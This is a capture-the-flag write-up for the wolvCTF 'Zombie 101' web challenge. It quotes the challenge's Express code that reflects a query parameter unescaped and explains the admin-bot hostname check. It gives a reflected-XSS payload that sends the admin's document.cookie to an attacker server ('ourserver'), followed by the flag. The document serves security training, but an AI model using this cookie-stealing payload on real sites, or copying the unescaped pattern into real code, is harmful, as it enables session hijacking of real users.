---
title: wolvCTF Zombie 101
type: page
description: writeups of wolvCTF.
topic: ctf
Author: bluesam
date: 2023-03-19
---
# Zombie 101 - Web
## Description 

Can you survive the Zombie gauntlet!?

First in a sequence of four related challenges. Solving one will unlock the next one in the sequence.

They all use the same source code but each one has a different configuration file.

This first one is a garden variety “steal the admin’s cookie”.

Good luck!

------------------------------------------

Reflected XSS on : https://zombie-101-tlejfksioa-ul.a.run.app/zombie?show=xsshere

Following vulnerable code :
```javascript
app.get('/zombie', function(req, res) {
    const show = req.query.show
    if (!show) {
        res.send('Hmmmm, you did not mention a show')
        return
    }

    const rating = Math.floor(Math.random() * 3)
    let blurb
    switch (rating) {
        case 2:
            blurb = `Wow, we really liked ${show} too!`
            break;
        case 1:
            blurb = `Yeah, ${show} was ok... I guess.`
            break;
        case 0:
            blurb = `Sorry, ${show} was horrible.`
            break;
    }
    res.send(blurb)
})
```
We can send report to admin who will trigger our link only if the link hostname strictly match `zombie-101-tlejfksioa-ul.a.run.app.`

index.js line 30

```javascript
 if (parsedURL.hostname !== req.hostname) {
        return `Please provide a url with a hostname of: ${escape(req.hostname)}  Hmmm, I guess that will restrict the submissions. TODO: Remove this restriction before the admin notices and we all get fired.` 
    }
```

Endpoint for report is https://zombie-101-tlejfksioa-ul.a.run.app/visit?url=

with all thoses informations we can craft our payload and steal the admin cookies. Our final payload :

https://zombie-101-tlejfksioa-ul.a.run.app/visit?url=https://zombie-101-tlejfksioa-ul.a.run.app/zombie?show=window.location.href="http://ourserver/?c=”.concat(document.cookie);

here the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261}
